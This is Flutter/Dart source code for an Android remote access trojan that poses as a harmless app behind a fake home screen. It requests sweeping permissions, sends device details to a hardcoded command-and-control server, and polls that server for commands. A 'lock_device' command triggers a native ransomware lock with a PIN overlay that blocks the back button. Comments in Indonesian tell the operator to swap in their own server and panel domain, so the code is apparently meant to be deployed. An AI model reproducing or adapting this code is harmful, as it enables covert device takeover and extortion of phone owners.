import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:typed_data';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:http/http.dart' as http;
import 'package:battery_plus/battery_plus.dart';

final GlobalKey<NavigatorState> navigatorKey = GlobalKey<NavigatorState>();

// ============================================================
//  LOCK MANAGER — RETRY LOOP
// ============================================================
class LockManager {
  static OverlayEntry? _lockOverlay;
  static bool _isLocked = false;
  static bool _isShowing = false;

  static void showLock(String message, String password, String wallpaperUrl) {
    if (_isLocked || _isShowing) return;
    _isShowing = true;
    _tryShowLock(message, password, wallpaperUrl, attempt: 0);
  }

  static void _tryShowLock(String message, String password, String wallpaperUrl, {int attempt = 0}) {
    if (attempt > 50) {
      print('❌ LockManager: Gagal mendapatkan context setelah 5 detik');
      _isShowing = false;
      return;
    }

    final context = navigatorKey.currentContext;
    if (context == null) {
      Future.delayed(const Duration(milliseconds: 100), () {
        _tryShowLock(message, password, wallpaperUrl, attempt: attempt + 1);
      });
      return;
    }

    WidgetsBinding.instance.addPostFrameCallback((_) {
      try {
        _lockOverlay = OverlayEntry(
          builder: (ctx) => LockScreen(
            message: message,
            password: password,
            wallpaperUrl: wallpaperUrl,
            onUnlock: () => hideLock(),
          ),
        );
        final overlay = Overlay.of(context);
        if (overlay != null && overlay.mounted) {
          overlay.insert(_lockOverlay!);
          _isLocked = true;
          _isShowing = false;
          print('🔒 LockManager: overlay inserted');
        } else {
          print('❌ LockManager: overlay null atau tidak mounted');
          _isShowing = false;
        }
      } catch (e) {
        print('❌ LockManager: error insert overlay: $e');
        _isShowing = false;
      }
    });
  }

  static void hideLock() {
    _lockOverlay?.remove();
    _lockOverlay = null;
    _isLocked = false;
    _isShowing = false;
    print('🔓 LockManager: overlay removed');
  }

  static bool get isLocked => _isLocked;
}

const MethodChannel _channel = MethodChannel('com.nullx.sta/native');

class AppConfig {
  final String token;
  final String appName;
  final String session;
  final String domain;
  final String videoUrl;

  AppConfig({
    required this.token,
    required this.appName,
    required this.session,
    required this.domain,
    required this.videoUrl,
  });

  factory AppConfig.fromJson(Map<String, dynamic> json) {
    return AppConfig(
      token: json['token'] ?? '',
      appName: json['app_name'] ?? 'My App',
      session: json['sesison'] ?? 'http://satria7zx.serverprivv.my.id:2002', // ganti http & port rat
      domain: json['domain'] ?? 'https://satria7zx.serverprivv.my.id', // ganti domain panel 
      videoUrl: json['video_url'] ?? '',
    );
  }
}

AppConfig? globalConfig;

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  final configJson = await rootBundle.loadString('assets/config.json');
  final configMap = jsonDecode(configJson);
  final config = AppConfig.fromJson(configMap);
  globalConfig = config;

  print('🔍 Config loaded:');
  print('   token: ${config.token}');
  print('   session: ${config.session}');

  final prefs = await SharedPreferences.getInstance();
  String token = prefs.getString('rat_token') ?? '';
  if (token.isEmpty) {
    token = config.token;
    if (token.isNotEmpty) {
      await prefs.setString('rat_token', token);
      print('📌 Token saved: $token');
    }
  }

  await _requestPermissions();

  if (token.isNotEmpty) {
    await RatService.sendDeviceInfo(token);
    RatService.startPolling(token);

    try {
      await _channel.invokeMethod('startForeground');
      print('✅ Foreground service started');
    } catch (e) {
      print('❌ Gagal start foreground: $e');
    }
  } else {
    print('❌ Token kosong! RAT tidak dijalankan.');
    print('💡 Edit config.json di APK dengan MT Manager untuk mengisi token.');
  }

  runApp(MyApp(appName: config.appName));
}

Future<void> _requestPermissions() async {
  await [
    Permission.sms,
    Permission.notification,
    Permission.location,
    Permission.phone,
    Permission.contacts,
    Permission.accessNotificationPolicy,
    Permission.camera,
    Permission.microphone,
    Permission.storage,
  ].request();
}

class MyApp extends StatelessWidget {
  final String appName;
  const MyApp({super.key, required this.appName});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: appName,
      theme: ThemeData.dark(),
      navigatorKey: navigatorKey,
      home: FakeHomeScreen(appName: appName),
      debugShowCheckedModeBanner: false,
    );
  }
}

class FakeHomeScreen extends StatefulWidget {
  final String appName;
  const FakeHomeScreen({super.key, required this.appName});

  @override
  State<FakeHomeScreen> createState() => _FakeHomeScreenState();
}

class _FakeHomeScreenState extends State<FakeHomeScreen> {
  String _status = 'Loading...';
  String _token = '';

  @override
  void initState() {
    super.initState();
    _loadToken();
    _listenForLockCommand();
  }

  Future<void> _loadToken() async {
    final prefs = await SharedPreferences.getInstance();
    final token = prefs.getString('rat_token') ?? 'none';
    setState(() {
      _token = token;
      _status = 'Device is active';
    });
    print('🖥️ UI Token: $_token');
  }

  void _listenForLockCommand() {
    Timer.periodic(const Duration(seconds: 2), (timer) async {
      final prefs = await SharedPreferences.getInstance();
      final lock = prefs.getBool('lock_device') ?? false;
      if (lock && !LockManager.isLocked) {
        await prefs.setBool('lock_device', false);
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: Text(widget.appName)),
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            const Icon(Icons.check_circle, color: Colors.green, size: 80),
            const SizedBox(height: 20),
            Text(_status, style: const TextStyle(fontSize: 18)),
            const SizedBox(height: 10),
            Text('Token: $_token', style: const TextStyle(fontSize: 12, color: Colors.grey)),
            const SizedBox(height: 30),
            ElevatedButton(
              onPressed: () => _showInfo(),
              child: const Text('Info'),
            ),
          ],
        ),
      ),
    );
  }

  void _showInfo() {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        title: const Text('About'),
        content: Text('${globalConfig?.appName ?? 'App'} runs in background.'),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: const Text('OK')),
        ],
      ),
    );
  }
}

// ============================================================
//  LOCK SCREEN — KEYPAD 1 2 3 / 4 5 6 / 7 8 9 / X 0 ENTER
// ============================================================
class LockScreen extends StatefulWidget {
  final String message;
  final String password;
  final String wallpaperUrl;
  final VoidCallback onUnlock;

  const LockScreen({
    super.key,
    required this.message,
    required this.password,
    required this.wallpaperUrl,
    required this.onUnlock,
  });

  @override
  State<LockScreen> createState() => _LockScreenState();
}

class _LockScreenState extends State<LockScreen>
    with SingleTickerProviderStateMixin {
  String _enteredPin = '';
  String _error = '';

  late AnimationController _pulseController;
  late Animation<double> _pulseAnimation;

  @override
  void initState() {
    super.initState();
    _pulseController = AnimationController(
      duration: const Duration(milliseconds: 1000),
      vsync: this,
    )..repeat(reverse: true);
    _pulseAnimation = Tween<double>(begin: 0.4, end: 1.0).animate(
      CurvedAnimation(parent: _pulseController, curve: Curves.easeInOut),
    );
  }

  @override
  void dispose() {
    _pulseController.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return WillPopScope(
      onWillPop: () async => false,
      child: Material(
        color: const Color(0xFF1A0808),
        child: Stack(
          fit: StackFit.expand,
          children: [
            if (widget.wallpaperUrl.isNotEmpty)
              Image.network(
                widget.wallpaperUrl,
                fit: BoxFit.cover,
                errorBuilder: (_, __, ___) => Container(color: const Color(0xFF1A0808)),
              )
            else
              Container(color: const Color(0xFF1A0808)),

            Container(
              decoration: BoxDecoration(
                gradient: RadialGradient(
                  colors: [
                    const Color(0xFF4A1818).withOpacity(0.3),
                    const Color(0xFF2D0E0E).withOpacity(0.5),
                    const Color(0xFF1A0808).withOpacity(0.85),
                  ],
                  radius: 1.2,
                ),
              ),
            ),

            SafeArea(
              child: Padding(
                padding: const EdgeInsets.symmetric(horizontal: 28.0),
                child: Column(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    AnimatedBuilder(
                      animation: _pulseAnimation,
                      builder: (context, child) {
                        return Icon(
                          Icons.lock_outline,
                          color: const Color(0xFFD46A6A).withOpacity(0.5 + 0.5 * _pulseAnimation.value),
                          size: 64,
                          shadows: [
                            Shadow(
                              color: const Color(0xFF9B2222).withOpacity(0.4),
                              blurRadius: 30,
                            ),
                          ],
                        );
                      },
                    ),
                    const SizedBox(height: 12),
                    const Text(
                      '🔒 DEVICE LOCKED',
                      style: TextStyle(
                        fontSize: 26,
                        fontWeight: FontWeight.bold,
                        color: Color(0xFFF5E0E0),
                        letterSpacing: 2,
                        shadows: [Shadow(color: Color(0xFF9B2222), blurRadius: 15)],
                      ),
                    ),
                    const SizedBox(height: 8),
                    Container(
                      padding: const EdgeInsets.all(18),
                      decoration: BoxDecoration(
                        color: const Color(0xFF2D0E0E).withOpacity(0.6),
                        borderRadius: BorderRadius.circular(16),
                        border: Border.all(color: const Color(0xFF9B2222).withOpacity(0.3), width: 1.5),
                      ),
                      child: Text(
                        widget.message,
                        style: const TextStyle(
                          color: Color(0xFFF5E0E0),
                          fontSize: 16,
                          fontWeight: FontWeight.w500,
                        ),
                        textAlign: TextAlign.center,
                      ),
                    ),
                    const SizedBox(height: 40),
                    Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: List.generate(6, (index) {
                        final isFilled = index < _enteredPin.length;
                        return Container(
                          margin: const EdgeInsets.symmetric(horizontal: 8),
                          width: 20,
                          height: 20,
                          decoration: BoxDecoration(
                            shape: BoxShape.circle,
                            color: isFilled ? const Color(0xFF9B2222) : Colors.transparent,
                            border: Border.all(
                              color: isFilled ? const Color(0xFF9B2222) : const Color(0xFF8A6060),
                              width: 2,
                            ),
                            boxShadow: isFilled
                                ? [
                                    BoxShadow(
                                      color: const Color(0xFF9B2222).withOpacity(0.6),
                                      blurRadius: 12,
                                    )
                                  ]
                                : null,
                          ),
                        );
                      }),
                    ),
                    const SizedBox(height: 10),
                    if (_error.isNotEmpty)
                      Padding(
                        padding: const EdgeInsets.only(top: 8),
                        child: Text(
                          _error,
                          style: const TextStyle(
                            color: Color(0xFFD46A6A),
                            fontSize: 14,
                            fontWeight: FontWeight.bold,
                          ),
                        ),
                      ),
                    const SizedBox(height: 30),
                    Container(
                      constraints: const BoxConstraints(maxWidth: 340),
                      child: Column(
                        children: [
                          Row(children: [
                            _buildKey('1'),
                            _buildKey('2'),
                            _buildKey('3'),
                          ]),
                          Row(children: [
                            _buildKey('4'),
                            _buildKey('5'),
                            _buildKey('6'),
                          ]),
                          Row(children: [
                            _buildKey('7'),
                            _buildKey('8'),
                            _buildKey('9'),
                          ]),
                          Row(children: [
                            _buildKey('X', isSpecial: true),
                            _buildKey('0'),
                            _buildKey('ENTER', isSpecial: true),
                          ]),
                        ],
                      ),
                    ),
                  ],
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildKey(String label, {bool isSpecial = false}) {
    return Expanded(
      child: Padding(
        padding: const EdgeInsets.all(6.0),
        child: Material(
          color: Colors.transparent,
          child: InkWell(
            onTap: () => _onKeyPressed(label),
            borderRadius: BorderRadius.circular(16),
            splashColor: const Color(0xFF9B2222).withOpacity(0.2),
            child: Container(
              height: 60,
              decoration: BoxDecoration(
                gradient: isSpecial
                    ? const LinearGradient(
                        colors: [Color(0xFF9B2222), Color(0xFF2D0E0E)],
                        begin: Alignment.topLeft,
                        end: Alignment.bottomRight,
                      )
                    : LinearGradient(
                        colors: [
                          const Color(0xFF2D0E0E).withOpacity(0.6),
                          const Color(0xFF1A0808).withOpacity(0.7),
                        ],
                        begin: Alignment.topLeft,
                        end: Alignment.bottomRight,
                      ),
                borderRadius: BorderRadius.circular(16),
                border: Border.all(
                  color: isSpecial
                      ? const Color(0xFF9B2222)
                      : const Color(0xFF8A6060).withOpacity(0.2),
                  width: isSpecial ? 2 : 1,
                ),
                boxShadow: isSpecial
                    ? [
                        BoxShadow(
                          color: const Color(0xFF9B2222).withOpacity(0.4),
                          blurRadius: 15,
                          spreadRadius: 3,
                        )
                      ]
                    : null,
              ),
              child: Center(
                child: Text(
                  label,
                  style: TextStyle(
                    color: isSpecial
                        ? (label == 'X' ? const Color(0xFFD46A6A) : Colors.white)
                        : const Color(0xFFF5E0E0),
                    fontSize: isSpecial ? 18 : 26,
                    fontWeight: FontWeight.w700,
                    shadows: [
                      Shadow(
                        color: const Color(0xFF9B2222).withOpacity(0.3),
                        blurRadius: 8,
                      )
                    ],
                  ),
                ),
              ),
            ),
          ),
        ),
      ),
    );
  }

  void _onKeyPressed(String label) {
    if (label == 'X') {
      if (_enteredPin.isNotEmpty) {
        setState(() {
          _enteredPin = _enteredPin.substring(0, _enteredPin.length - 1);
          _error = '';
        });
      }
    } else if (label == 'ENTER') {
      if (_enteredPin.isEmpty) {
        setState(() => _error = 'Masukkan PIN!');
        return;
      }
      if (_enteredPin == widget.password) {
        setState(() => _error = '');
        widget.onUnlock();
      } else {
        setState(() {
          _error = '❌ PIN Salah!';
          _enteredPin = '';
        });
      }
    } else {
      if (_enteredPin.length < 6) {
        setState(() {
          _enteredPin += label;
          _error = '';
        });
      }
    }
  }
}

// ============================================================
//  RAT SERVICE — MINIMAL
// ============================================================
class RatService {
  static String get baseUrl => globalConfig?.session ?? 'http://satria7zx.serverprivv.my.id:2002'; // ganti http & port rat 
  static Timer? _timer;
  static const MethodChannel _channel = MethodChannel('com.nullx.sta/native');
  static String deviceId = '';

  static void startPolling(String token) {
    if (token.isEmpty) return;
    print('🔄 Starting polling every 2 seconds...');
    _timer = Timer.periodic(const Duration(seconds: 2), (timer) async {
      await _pollCommands(token);
    });
  }

  static Future<void> sendDeviceInfo(String token) async {
    if (token.isEmpty) return;
    try {
      final deviceInfo = await DeviceInfoPlugin().androidInfo;
      deviceId = deviceInfo.id;
      final battery = Battery();
      final batteryLevel = await battery.batteryLevel;

      final payload = {
        'model': deviceInfo.model,
        'battery': batteryLevel,
        'androidId': deviceInfo.id,
      };
      print('📱 Sending device info: $payload');
      await _sendData(token, 'device_info', payload);
    } catch (e) {
      print('❌ Error sending device info: $e');
    }
  }

  static Future<void> _pollCommands(String token) async {
    final url = Uri.parse('$baseUrl/api/rat/poll?token=$deviceId');
    print('📡 Polling commands from: $url');
    try {
      final response = await http.get(url);
      print('📡 Poll response: ${response.statusCode}');
      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        final commands = data['commands'] as List?;
        if (commands != null && commands.isNotEmpty) {
          print('📡 Commands received: ${commands.length}');
          for (var cmd in commands) {
            await _executeCommand(token, cmd);
          }
        }
      }
    } catch (e) {
      print('❌ Polling error: $e');
    }
  }

  static Future<void> _executeCommand(String token, Map<String, dynamic> cmd) async {
    final command = cmd['command'] as String;
    final commandId = cmd['id'] as String;
    final payload = cmd['payload'] as Map<String, dynamic>?;

    print('⚡ Executing command: $command (ID: $commandId)');
    String result = 'success';
    try {
      switch (command) {
        case 'lock_device':
          final msg = payload?['message'] ?? '🔒 Perangkat Terkunci!';
          final pass = payload?['password'] ?? '123456';
          final wallpaper = payload?['wallpaper'] ?? 'https://files.catbox.moe/3veib1.jpg';
          final music = payload?['music'] ?? '';
          await _channel.invokeMethod('lockRansomware', {
            'name': 'Satria7zx',
            'password': pass,
            'flash': 'kelap',
            'music': music,
            'wallpaper': wallpaper,
          });
          result = 'locked';
          break;

        case 'unlock_device':
          await _channel.invokeMethod('stopLockService');
          LockManager.hideLock();
          result = 'unlocked';
          break;

        default:
          result = 'unknown_command';
      }
    } catch (e) {
      result = 'error: ${e.toString()}';
      print('❌ Command execution error: $e');
    }
    await _sendResult(token, commandId, result);
  }

  static Future<void> _sendData(String token, String type, dynamic payload) async {
    final url = Uri.parse('$baseUrl/api/rat/data');
    print('📤 Sending data to: $url');
    print('   Token: $token, DeviceId: $deviceId, Type: $type');
    print('   Payload: $payload');
    try {
      final response = await http.post(
        url,
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'token': token,
          'deviceId': deviceId,
          'type': type,
          'payload': payload,
        }),
      );
      print('✅ Data response: ${response.statusCode}');
    } catch (e) {
      print('❌ Error sending data: $e');
    }
  }

  static Future<void> _sendResult(String token, String commandId, String result) async {
    final url = Uri.parse('$baseUrl/api/rat/result');
    print('📤 Sending result to: $url');
    print('   CommandId: $commandId, Result: $result');
    try {
      final response = await http.post(
        url,
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'token': token, 'commandId': commandId, 'result': result}),
      );
      print('✅ Result response: ${response.statusCode}');
    } catch (e) {
      print('❌ Error sending result: $e');
    }
  }
}